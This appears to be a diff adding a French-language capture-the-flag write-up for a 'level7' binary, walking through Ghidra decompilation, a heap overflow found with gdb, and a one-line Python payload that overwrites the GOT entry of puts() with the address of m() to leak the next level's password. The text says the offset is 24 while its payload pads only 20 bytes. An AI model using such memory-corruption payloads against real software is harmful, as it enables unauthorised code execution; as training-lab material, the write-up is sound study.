@@ -1,0 +1,30 @@
+Je commence par decompiler le binaire level7 avec ghidra:
+
+Dans le code il y a une fonction m().
+
+La fonction m() declare une variable time_t var1 et stock la date actuelle dedans avec un appel a time() puis appelle printf("%s - %d\n", c var1)
+La fonction main() alloue 3 variables puis copie argv[1] dans le premier et argv[2] dans le troisime. Puis il lit le fichier contenant le mot de passe de level8 avec fgets() puis appelle puts("~~"). Cependant il lit le fichier avec un buffer 'c' non declare.
+
+Il doit y avoir un moyen d'afficher le contenu de la variable a l'aide de printf dans m(). 
+
+
+Je veux essayer de changer l'adresse de puts() par celle de m()
+
+GOT address of puts -> 0x8049928
+address of m() -> 0x080484f4
+
+
+Avec gdb je run le programme avec les arguments suivants pour trouver la zone memoire ou je peux ecrire:
+
+(gdb)run AAAABBBBCCCCDDDDEEEEFFFFGGGG HHHH
+
+Le programme segfault et en affichante eax j'obtient 0x47474747 soit "GGGG"
+
+Donc l'offset est de 24.
+
+J'ecrit l'exploitation:
+
+#!/usr/bin/python
+
+print 'AAAABBBBCCCCDDDDEEEE' + '\x28\x99\x04\x08' + ' ' +'\xf4\x84\x04\x08'
+
